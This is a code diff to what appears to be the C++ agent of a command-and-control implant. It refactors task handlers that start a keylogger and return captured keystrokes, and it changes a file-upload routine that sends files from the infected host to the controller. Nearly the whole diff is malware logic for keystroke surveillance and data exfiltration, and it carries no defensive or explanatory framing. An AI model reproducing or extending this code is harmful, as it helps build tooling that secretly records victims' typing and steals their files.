@@ -102,18 +102,11 @@ void Agent::Start()
                             downloadRequest.data);
                     },
 
-                    // Handle keylogger start requests.
-                    [this](const TaskRequest<Keylogger> &keyloggerStartRequest) -> Response
+                    [this](const TaskRequest<CommandKeylogger> &keyloggerRequest) -> Response
                     {
-                        Keylogger keylogger;
-                        return this->keylogger.keylog_start(keyloggerStartRequest.taskID, keyloggerStartRequest.data);
-                    },
-
-                    // Handle keylogger stop requests.
-                    [this](const TaskRequest<Keylogger> &keyloggerStopRequest) -> Response
-                    {
-                        Keylogger keylogger;
-                        return this->keylogger.get_keylog_data(keyloggerStopRequest.taskID, keyloggerStopRequest.data);
+                        return keyloggerRequest.type == KEYLOGGER_START
+                            ? this->keylogger.keylog_start(keyloggerRequest.taskID)
+                            : this->keylogger.get_keylog_data(keyloggerRequest.taskID);
                     },
 
                     // Return an error response for explicitly unsupported Boolean tasks.
@@ -475,7 +468,7 @@ IntitalCheckinRequest Agent::GetHostInformation()
 // File Transfer Commands
 Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadRequest)
 {
-    const bool sent = commManager.SendFile(uploadRequest.path);
+    const bool sent = commManager.SendFile(uploadRequest.path, taskID);
     if (sent)
         return CreateTaskResponse(taskID, UPLOAD, NO_CODE, SUCCESS,
                                   TaskSuccess{"File uploaded successfully."});
@@ -494,8 +487,8 @@ Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downl
                                    : std::ios::binary | std::ios::app);
     output.write(bytes.data(), static_cast<std::streamsize>(bytes.size()));
     if (output)
-        return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, SUCCESS,
+        return CreateTaskResponse(taskID, DOWNLOAD, DOWNLOAD, SUCCESS,
                                   TaskSuccess{"File chunk stored."});
-    return CreateTaskResponse(taskID, DOWNLOAD_2, DOWNLOAD, TASK_ERROR,
+    return CreateTaskResponse(taskID, DOWNLOAD, DOWNLOAD, TASK_ERROR,
                               TaskError{1, "File chunk could not be stored."});
 }
